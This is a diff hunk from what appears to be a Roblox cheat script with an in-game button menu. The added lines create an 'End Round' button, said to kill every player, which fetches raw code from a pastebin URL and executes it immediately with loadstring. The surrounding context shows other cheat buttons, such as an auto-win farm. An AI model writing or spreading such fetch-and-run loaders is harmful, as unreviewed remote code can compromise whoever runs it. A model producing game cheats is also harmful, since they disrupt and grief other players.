@@ -99,6 +99,10 @@ MainSection:NewButton("Auto Win Farm", "ez", function()
 		game.Players.LocalPlayer.Character:FindFirstChild('Humanoid').PlatformStand = false
 		end)
 
+MainSection:NewButton("End Round", "kills everyone including you", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Vj9MjRSP"))()  
+end)
+
 MainSection:NewKeybind("Box Mine", "better mining algorithm", Enum.KeyCode.C, function()
 	function onTouched(part)       
 		local h = part
